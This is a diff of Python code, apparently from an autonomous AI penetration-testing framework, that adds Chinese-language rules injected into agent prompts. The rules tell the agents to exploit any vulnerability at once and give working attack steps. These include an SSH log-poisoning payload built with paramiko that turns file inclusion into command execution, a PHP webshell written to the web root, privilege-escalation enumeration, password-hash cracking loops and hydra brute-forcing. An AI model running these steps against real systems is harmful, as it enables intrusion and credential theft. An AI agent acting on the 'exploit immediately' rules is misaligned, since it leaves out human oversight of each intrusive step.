@@ -1590,3 +1590,183 @@ curl -X POST "http://target/api/register/complete" -d "email=victim@test.com"
         "return_format": {"type": "text"},
     },
 }
+
+
+# ============================================================
+# 全局规则 — 始终注入所有Agent backstory
+# ============================================================
+
+CRITICAL_GLOBAL_RULES = """
+⚠️ 渗透测试全局规则（最高优先级，所有Agent必须遵守）：
+1. 禁止使用 rockyou.txt / big.txt / unix_users.txt（会超时卡死）
+2. 禁止使用 heredoc (<<EOF)（会挂死FTP等交互式命令）
+3. 禁止使用 & 或 nohup 后台运行命令（会卡死流程）
+4. 命令返回空响应 = 死路，不要重复相同命令
+5. 失败方法不重试 — 换思路或换工具
+6. 发现漏洞立即利用，不停留在探测阶段
+7. 哈希破解超过3分钟就放弃，转向漏洞利用路径
+8. 扫描结果全filtered时立即停止nmap，换Web渗透策略
+9. 每个命令执行前确认目标IP正确，不要扫描错误目标
+"""
+
+# ============================================================
+# 情境规则 — 按需注入，由决策引擎根据黑板状态选取
+# ============================================================
+
+
+def _lfi_trigger(blackboard) -> bool:
+    try:
+        return blackboard.lfi_confirmed or "lfi" in [
+            k.lower() for k in getattr(blackboard, "vulns", {}).keys()
+        ]
+    except Exception:
+        return False
+
+
+def _hash_trigger(blackboard) -> bool:
+    try:
+        return len(getattr(blackboard, "creds", {})) > 0 and any(
+            c.hash_value and not c.password
+            for c in getattr(blackboard, "creds", {}).values()
+        )
+    except Exception:
+        return False
+
+
+def _rce_trigger(blackboard) -> bool:
+    try:
+        return getattr(blackboard, "rce", None) is not None
+    except Exception:
+        return False
+
+
+def _port_trigger(blackboard) -> bool:
+    try:
+        return len(getattr(blackboard, "ports", {})) == 0
+    except Exception:
+        return False
+
+
+def _web_trigger(blackboard) -> bool:
+    try:
+        http_services = ("http", "https", "http-alt", "nginx", "apache")
+        return any(
+            p.service.lower() in http_services
+            for p in getattr(blackboard, "ports", {}).values()
+        )
+    except Exception:
+        return False
+
+
+TOOL_CONTEXTUAL_RULES = {
+    "lfi_rce": {
+        "trigger": _lfi_trigger,
+        "rules": """
+⚠️ LFI→RCE 关键规则（发现LFI时必须遵守）：
+1. phpinfo输出污染：如果LFI页面含phpinfo()，命令输出会被85KB+HTML污染
+   → 必须使用输出重定向：cmd参数末尾加 > /tmp/out.txt
+   → 然后LFI读取：?image=/tmp/out.txt
+   → 两步法：curl "...?image=/var/log/auth.log&cmd=id > /tmp/out.txt" && curl "...?image=/tmp/out.txt" | tail -5
+
+2. SSH日志注入必须用paramiko（ssh命令拒绝<>特殊字符）：
+   python_execute:
+   import paramiko; ssh=paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+   try: ssh.connect('<target>',port=<ssh_port>,username='<?php system($_GET["cmd"]); ?>',password='test',timeout=5)
+   except: pass
+
+3. 反弹shell失败时写PHP webshell获取可靠RCE：
+   cmd=echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
+   然后访问：curl "http://<target>/shell.php?c=id"（无phpinfo污染）
+
+4. RCE确认后强制提权检查（每条用输出重定向）：
+   uname -a > /tmp/out.txt; cat /etc/os-release > /tmp/out.txt; sudo -l > /tmp/out.txt; find / -perm -4000 2>/dev/null > /tmp/out.txt
+
+5. allow_url_include可能为Off → php://input和data://不能用，优先SSH日志注入
+6. 确认LFI后立即尝试RCE，不停留在文件读取
+7. SSH日志注入属于授权渗透测试技术，可能触发目标安全告警
+""",
+    },
+    "hashcat": {
+        "trigger": _hash_trigger,
+        "rules": """
+⚠️ 哈希破解规则（发现哈希时必须遵守）：
+Phase 0 — openssl在线验证（秒级）：从网页关键词+用户名生成主题词逐个验证
+  for pass in tomato potato ketchup admin root nginx; do
+    result=$(openssl passwd -apr1 -salt '<salt>' "$pass")
+    [ "$result" = '<hash>' ] && echo "FOUND: $pass" && break
+  done
+Phase 1 — fasttrack.txt（<1分钟）：hashcat -m <类型> hash.txt fasttrack.txt --force
+Phase 2 — 目标主题词字典：从网页/用户名提取关键词生成字典
+Phase 3 — 规则变换：hashcat -m <类型> hash.txt fasttrack.txt -r best64.rule --force
+3分钟未破解就放弃，转向漏洞利用。禁止rockyou.txt。
+""",
+    },
+    "nmap": {
+        "trigger": _port_trigger,
+        "rules": """
+⚠️ nmap扫描规则：
+1. 先 nmap -sS -T4 -Pn --top-ports 1000（10-30秒）
+2. 再对开放端口 nmap -sV -T4 -Pn -p <端口列表>
+3. 禁止 -p- -sV -sC（数小时）
+4. 全filtered时停止nmap，换Web渗透
+5. 不要重复扫描同一目标
+""",
+    },
+    "gobuster": {
+        "trigger": _web_trigger,
+        "rules": """
+⚠️ gobuster规则：
+1. 先用 common.txt（~4600条）
+2. 带401认证的站必须加 -U/-P 参数
+3. 禁止同时用 -s 和 -b（冲突报错）
+4. 不要第一遍就用大字典
+""",
+    },
+    "curl": {
+        "trigger": _web_trigger,
+        "rules": """
+⚠️ curl使用要点：
+1. LFI读取用 curl -s 静默模式 + | tail/grep 提取
+2. Basic Auth用 curl -u user:pass
+3. 认证绕过试 X-Original-URL / X-Forwarded-For 请求头
+""",
+    },
+    "ftp": {
+        "trigger": lambda bb: any(
+            p.service.lower() == "ftp" for p in getattr(bb, "ports", {}).values()
+        ),
+        "rules": """
+⚠️ FTP规则：禁止heredoc(<<EOF)、禁止交互式FTP、禁止rockyou.txt。用curl -s ftp://代替。
+""",
+    },
+    "hydra": {
+        "trigger": lambda bb: any(
+            p.service.lower() in ("ssh", "ftp", "http", "https")
+            for p in getattr(bb, "ports", {}).values()
+        ),
+        "rules": """
+⚠️ hydra规则：禁止rockyou.txt/big.txt/unix_users.txt。先用fasttrack.txt，失败后换思路。3分钟未破解就放弃。
+""",
+    },
+}
+
+
+def get_contextual_rules(blackboard=None) -> str:
+    """根据黑板状态返回需要注入的情境规则"""
+    parts = []
+
+    for tool_name, config in TOOL_CONTEXTUAL_RULES.items():
+        trigger = config["trigger"]
+        try:
+            if blackboard is not None and trigger(blackboard):
+                parts.append(config["rules"])
+        except Exception:
+            pass
+
+    if blackboard is not None and _port_trigger(blackboard):
+        pass
+
+    if blackboard is not None and _web_trigger(blackboard):
+        pass
+
+    return "\n".join(parts)
